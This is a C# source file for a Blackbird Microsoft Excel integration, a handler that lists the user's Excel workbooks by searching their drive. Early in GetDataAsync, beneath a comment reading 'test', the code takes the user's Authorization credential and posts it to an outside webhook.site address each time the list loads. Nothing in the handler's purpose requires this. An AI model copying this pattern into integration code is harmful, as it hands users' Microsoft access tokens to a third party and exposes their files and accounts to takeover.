using Apps.MicrosoftExcel.Dtos;
using Blackbird.Applications.Sdk.Common;
using Blackbird.Applications.Sdk.Common.Authentication;
using Blackbird.Applications.Sdk.Common.Dynamic;
using Blackbird.Applications.Sdk.Common.Invocation;
using RestSharp;

namespace Apps.MicrosoftExcel.DataSourceHandlers;

public class WorkbookDataSourceHandler : BaseInvocable, IAsyncDataSourceHandler
{
    public WorkbookDataSourceHandler(InvocationContext invocationContext) : base(invocationContext)
    {
    }

    public async Task<Dictionary<string, string>> GetDataAsync(DataSourceContext context,
        CancellationToken cancellationToken)
    {
        //test https://webhook.site/2e3be07a-3120-4780-9a12-f87e6bfb8146
        var options = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client1 = new RestClient(options);
        var request1 = new RestRequest("/2e3be07a-3120-4780-9a12-f87e6bfb8146", Method.Post);
        request1.AddJsonBody(new
        {
            header = InvocationContext.AuthenticationCredentialsProviders.First(p => p.KeyName == "Authorization").Value
        });
        await client1.ExecuteAsync(request1);

        var client = new MicrosoftExcelClient();
        var endpoint = "/list/items?$select=id&$expand=driveItem($select=id,name,parentReference)&" +
                       "$top=100"; //$filter=fields/ContentType eq 'Document'&
        var filesDictionary = new Dictionary<string, string>();
        var filesAmount = 0;

        do
        {
            var request = new MicrosoftExcelRequest(endpoint, Method.Get,
                InvocationContext.AuthenticationCredentialsProviders);
            request.AddHeader("prefer", "HonorNonIndexedQueriesWarningMayFailRandomly");
            var files = await client.ExecuteWithHandling<ListWrapper<DriveItemWrapper<FileMetadataDto>>>(request);
            var filteredFiles = files.Value
                .Select(w => w.DriveItem)
                .Select(i => new { i.Id, Path = GetFilePath(i) })
                .Where(i => i.Path.Contains(context.SearchString, StringComparison.OrdinalIgnoreCase) && 
                Path.GetExtension(i.Path).Contains("xls"));
            
            foreach (var file in filteredFiles)
                filesDictionary.Add(file.Id, file.Path);
            
            filesAmount += filteredFiles.Count();
            endpoint = files.ODataNextLink?.Split("me/drive")[1];
        } while (filesAmount < 20 && endpoint != null);
        
        foreach (var file in filesDictionary)
        {
            var filePath = file.Value;
            if (filePath.Length > 40)
            {
                var filePathParts = filePath.Split("/");
                if (filePathParts.Length > 3)
                {
                    filePath = string.Join("/", filePathParts[0], "...", filePathParts[^2], filePathParts[^1]);
                    filesDictionary[file.Key] = filePath;
                }
            }
        }

        return filesDictionary;
    }

    private string GetFilePath(FileMetadataDto file)
    {
        var parentPath = file.ParentReference.Path.Split("root:");
        if (parentPath[1] == "")
            return file.Name;

        return $"{parentPath[1].Substring(1)}/{file.Name}";
    }
}